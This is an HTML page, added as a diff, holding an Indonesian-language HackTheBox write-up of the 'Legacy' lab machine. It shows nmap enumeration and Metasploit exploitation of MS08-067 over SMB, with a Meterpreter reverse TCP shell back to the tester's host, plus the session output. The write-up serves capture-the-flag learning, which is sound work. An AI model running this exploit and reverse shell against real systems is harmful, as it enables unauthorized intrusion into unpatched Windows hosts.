@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            [Writeup][HackTheBox] Legacy  &ndash;
+        
+        Justakazh
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://justakazh.github.io/css/styles.26d59987c529c11f19dac0cd80af6b1379e56b7b612cae93654fdd40a27f308dc8961937dba7b34e8451321ffc6d66bfcf1fdd9d2602acb2bdee877e78ba4345.css integrity="sha512-JtWZh8UpwR8Z2sDNgK9rE3nla3thLK6TZU/dQKJ/MI3Ilhk326ezToRRMh/8bWa/zx/dnSYCrLK97od&#43;eLpDRQ==" />
+<meta name="author" content="Justakazh" />
+
+    
+        <meta name="keywords" content='easy, hackhebox, hacking, netapi, smb, windows, writeup, 445' />
+    
+    
+        <meta name="description" content=" : Legacy
+Machine Author : [ch4p](Hack The Box)
+Machine Difficult : Easy
+Machine URL : Hack The Box
+NMAP Enumeration Melakukan pengecheckan terhadap port yang umum
+└─$ sudo nmap 10.129.227.181 [sudo] password for punktester: Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 05:47 HST Nmap scan report for 10.129.227.181 Host is up (0.20s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Melakukan pengecheckan versi yang digunakan terhadap port yang terbuka" />
+    
+
+<meta property="og:site_name"
+    content='Justakazh' />
+
+    <meta property="og:title" content="[Writeup][HackTheBox] Legacy" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Justakazh" />
+    <meta
+        property="article:published_time"
+        content='2022-09-29T06:49:09Z-1000' />
+    
+        
+            <meta property="article:tag" content="easy" />
+        
+            <meta property="article:tag" content="hackhebox" />
+        
+            <meta property="article:tag" content="hacking" />
+        
+            <meta property="article:tag" content="netapi" />
+        
+            <meta property="article:tag" content="smb" />
+        
+            <meta property="article:tag" content="windows" />
+        
+            <meta property="article:tag" content="writeup" />
+        
+            <meta property="article:tag" content="445" />
+        
+    
+    <meta property="og:url" content="https://justakazh.github.io/posts/writeuphackthebox-legacy/" />
+    <meta property="og:image"
+        content='https://justakazh.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="Summary Machine Name : Legacy
+Machine Author : [ch4p](Hack The Box)
+Machine Difficult : Easy
+Machine URL : Hack The Box
+NMAP Enumeration Melakukan pengecheckan " />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='justakazh.github.io'
+/>
+<meta property="twitter:url" content="https://justakazh.github.io/posts/writeuphackthebox-legacy/" />
+
+
+    <meta name="twitter:title" content="[Writeup][HackTheBox] Legacy" />
+    
+    <meta name="twitter:image"
+        content='https://justakazh.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="Summary Machine Name : Legacy
+Machine Author : [ch4p](Hack The Box)
+Machine Difficult : Easy
+Machine URL : Hack The Box
+NMAP Enumeration Melakukan pengecheckan " />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<pre>                                            
+      _           _        _             _     
+     | |_   _ ___| |_ __ _| | ____ _ ___| |__  
+  _  | | | | / __| __/ _` | |/ / _` |_  / '_ \ 
+ | |_| | |_| \__ \ || (_| |   &lt; (_| |/ /| | | |
+  \___/ \__,_|___/\__\__,_|_|\_\__,_/___|_| |_|
+                                                                                            </pre><div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                   
+                </a>
+            
+
+            <div class="rightOfLogo">
+                <div id="wide_nav">
+<nav>
+
+    
+<br>
+<br />
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+	<li><a href="/tags">Tags</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/donate/">Donate</a></li>
+        
+            <li><a href="">HackStreet</a></li>
+        
+        
+            
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://facebook.com/hs1337">
+    
+    
+        &#xf09a;
+    
+    <span>
+        facebook
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/justakazh">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/akazh18">
+    
+    
+        &#xf099;
+    
+    <span>
+        Twitter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>[Writeup][HackTheBox] Legacy</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2022-09-29
+
+</p>
+    
+    
+    
+    
+    <div><h2 id="summary">Summary</h2>
+<p>Machine Name    : Legacy</p>
+<p>Machine Author  : [ch4p](<a href="https://app.hackthebox.com/users/1">Hack The Box</a>)</p>
+<p>Machine Difficult : Easy</p>
+<p>Machine URL        : <a href="https://app.hackthebox.com/machines/2">Hack The Box</a></p>
+<h2 id="nmap-enumeration">NMAP Enumeration</h2>
+<p>Melakukan pengecheckan terhadap port yang umum</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ sudo nmap 10.129.227.181 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> punktester: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-14 05:47 HST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.181
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span></code></pre></div><p>Melakukan pengecheckan versi yang digunakan terhadap port yang terbuka</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>punktester㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/htb/easy/legacy<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV 10.129.227.181 -p135,139,445  
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-14 05:48 HST
+</span></span><span style="display:flex;"><span>Stats: 0:00:18 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 33.33% <span style="color:#66d9ef">done</span>; ETC: 05:48 <span style="color:#f92672">(</span>0:00:12 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.181
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.62 seconds
+</span></span><span style="display:flex;"><span>zsh: segmentation fault  nmap -sV 10.129.227.181 -p135,139,445
+</span></span></code></pre></div><blockquote>
+<p>Mesin tersebut menggunakan sistem operasi windows xp.</p>
+</blockquote>
+<h2 id="445---smb">445 - SMB</h2>
+<p>saya tertarik dengan port 445 yang dimana port ini digunakan untuk Server Message Block (SMB). selanjutnya saya melakukan searching terkait potensi kerntanan pada sistem tersebut, saya mendapat sebuah artikel yang menarik tentang exploitasi pada windows xp</p>
+<p><a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/">https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/</a></p>
+<p>disini saya akan mencoba melakukan exploitasi port tersebut dengan menggunakan modul metasploit <strong>exploit/windows/smb/ms08_067_netapi</strong> (Microsoft Server Service Relative Path Stack Corruption) Modul ini mengeksploitasi kekurangan parsing pada path kanonikalisasi dari kode NetAPI32.dll melalui Layanan Server. Modul ini juga mampu melewati NX pada beberapa sistem operasi dan paket layanan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms08_067_netapi<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms08_067_netapi<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS   10.129.227.181   yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+</span></span><span style="display:flex;"><span>   RPORT    <span style="color:#ae81ff">445</span>              yes       The SMB service port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SMBPIPE  BROWSER          yes       The pipe name to use <span style="color:#f92672">(</span>BROWSER, SRVSVC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  thread           yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     10.10.14.15      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Automatic Targeting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms08_067_netapi<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.15:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.227.181:445 - Automatically detecting the target...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack <span style="color:#ae81ff">3</span> - lang:English
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.227.181:445 - Selected Target: Windows XP SP3 English <span style="color:#f92672">(</span>AlwaysOn NX<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.227.181:445 - Attempting to trigger the vulnerability...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175174</span> bytes<span style="color:#f92672">)</span> to 10.129.227.181
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.15:4444 -&gt; 10.129.227.181:1042 <span style="color:#f92672">)</span> at 2022-10-14 06:12:08 -1000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : LEGACY
+</span></span><span style="display:flex;"><span>OS              : Windows XP <span style="color:#f92672">(</span>5.1 Build 2600, Service Pack 3<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x86
+</span></span><span style="display:flex;"><span>System Language : en_US
+</span></span><span style="display:flex;"><span>Domain          : HTB
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x86/windows
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span></code></pre></div><p>disini saya berhasil mendapatkan akses server tersebut dengan memanfaatkan celah MS08-067.</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/easy">#easy</a>
+        
+            <a
+                
+                href="/tags/hackhebox">#hackhebox</a>
+        
+            <a
+                
+                href="/tags/hacking">#hacking</a>
+        
+            <a
+                
+                href="/tags/netapi">#netapi</a>
+        
+            <a
+                
+                href="/tags/smb">#smb</a>
+        
+            <a
+                
+                href="/tags/windows">#windows</a>
+        
+            <a
+                
+                href="/tags/writeup">#writeup</a>
+        
+            <a
+                
+                href="/tags/445">#445</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2022 &copy; Justakazh - Nulis karena pelupa
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
